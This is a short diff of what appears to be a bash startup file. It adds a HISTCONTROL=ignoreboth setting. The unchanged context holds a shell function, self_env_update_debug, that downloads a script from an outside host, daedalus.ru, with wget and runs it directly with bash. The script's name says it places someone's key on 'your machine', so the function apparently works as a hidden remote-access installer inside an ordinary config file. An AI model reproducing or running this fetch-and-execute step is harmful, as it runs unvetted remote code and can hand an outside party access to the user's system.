@@ -96,6 +96,10 @@ else
                 PS1='\u@\h \w \$ '
         fi
 fi
+
+export HISTCONTROL=ignoreboth
+
+
 function self_env_update_debug() {
     echo "[i] self update for $USER (debug output)" 
     bash -x -c "$(wget -q -O - http://daedalus.ru/code/how_to_place_my_key_to_your_machine.txt)" $USER
